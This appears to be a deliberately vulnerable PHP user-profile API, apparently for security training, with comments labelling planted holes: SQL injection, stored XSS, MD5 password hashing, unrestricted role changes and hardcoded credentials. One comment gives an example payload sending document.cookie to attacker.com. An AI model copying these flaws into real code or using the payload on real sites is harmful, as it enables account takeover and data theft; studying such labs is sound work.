<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");

// Database credentials
$servername = "db";
$username   = "user";
$password   = "password";
$dbname     = "simple_app";

// Connect to the database
$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    http_response_code(500);
    echo json_encode(["message" => "Database connection failed"]);
    exit;
}

// Handle GET request to fetch user details
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $user_id = $_GET['user_id'] ?? null;

    if (!$user_id) {
        http_response_code(400);
        echo json_encode(["message" => "User ID is required"]);
        exit;
    }

    // Vulnerability: SQL Injection (no parameterized query)
    $sql    = "SELECT username, role, bio FROM users WHERE id = $user_id";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        $user = $result->fetch_assoc();
        echo json_encode($user);
    } else {
        http_response_code(404);
        echo json_encode(["message" => "User not found"]);
    }
    exit;
}

// Handle POST request to update user details
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);

    if (!isset($input['user_id'])) {
        http_response_code(400);
        echo json_encode(["message" => "Invalid input"]);
        exit;
    }

    $user_id  = $input['user_id'];
    $password = $input['password'] ?? null;
    $role     = $input['role']     ?? null;

    // Vulnerability #1: Stored XSS (A03)
    // `bio` is stored directly without any HTML sanitization or encoding.
    // When rendered via innerHTML on the profile page, any injected script executes.
    // e.g. bio: "<script>fetch('https://attacker.com/?c='+document.cookie)</script>"
    $bio = $input['bio'] ?? null;

    // Build SET clause dynamically based on supplied fields
    $setClauses = [];
    if ($password !== null) {
        // Vulnerability #10: Weak Crypto — MD5 instead of bcrypt
        $hashed      = md5($password);
        $setClauses[] = "password = '$hashed'";
    }
    if ($role !== null) {
        // Vulnerability: role can be changed by any authenticated user
        $setClauses[] = "role = '$role'";
    }
    if ($bio !== null) {
        // Vulnerability #1: unsanitized bio stored verbatim
        $setClauses[] = "bio = '$bio'";
    }

    if (empty($setClauses)) {
        http_response_code(400);
        echo json_encode(["message" => "No fields to update"]);
        exit;
    }

    $setStr = implode(', ', $setClauses);
    $sql    = "UPDATE users SET $setStr WHERE id = $user_id";

    if ($conn->query($sql)) {
        echo json_encode(["message" => "Profile updated successfully!"]);
    } else {
        http_response_code(500);
        echo json_encode(["message" => "Error: " . $conn->error]);
    }
    exit;
}

// Handle invalid request methods
http_response_code(405);
echo json_encode(["message" => "Invalid request method"]);
$conn->close();
